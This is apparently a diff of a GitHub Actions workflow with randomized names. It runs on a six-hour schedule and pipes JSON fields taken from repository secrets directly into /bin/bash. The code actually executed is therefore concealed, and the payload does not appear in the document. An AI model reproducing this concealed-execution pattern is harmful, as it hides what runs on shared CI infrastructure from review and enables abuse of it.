@@ -1,8 +1,9 @@
 name: sunli19871010
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '59 1/6 * * *'
+    - cron: '2 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,16 +11,14 @@ jobs:
       - uses: actions/checkout@v4
       - name: sunli19871010
         env:
-          uvmcm1: ${{ secrets.uvmcm1 }}
+          eldvy4: ${{ secrets.eldvy4 }}
         run: |
-          echo $uvmcm1 | jq -r .mrj3843 | /bin/bash
-          echo $fwis6096 | jq -r .imelu546 | /bin/bash
-          echo $v58272 | jq -r .iqbme4965 | /bin/bash
-          echo $skhvk31642 | jq -r .gyt9151 | /bin/bash
-          echo $ui974 | jq -r .odbw4 | /bin/bash
-          echo $gj2 | jq -r .jmyzh28751 | /bin/bash
-          echo $grt66644 | jq -r .ak68534 | /bin/bash
-          echo $syzjh01510 | jq -r .lkj1 | /bin/bash
-          echo $aila248 | jq -r .ydiyo71 | /bin/bash
-          echo $bzhb01 | jq -r .qjjj21 | /bin/bash
+          echo $eldvy4 | jq -r .ox31904 | /bin/bash
+          echo $bgk97302 | jq -r .dwnev59 | /bin/bash
+          echo $ag01 | jq -r .vktjt01745 | /bin/bash
+          echo $qv38 | jq -r .meowc68 | /bin/bash
+          echo $i4413 | jq -r .jq8 | /bin/bash
+          echo $oap4355 | jq -r .lk9 | /bin/bash
+          echo $vcv2 | jq -r .ur70361 | /bin/bash
+          echo $gy270 | jq -r .nyo3 | /bin/bash
 
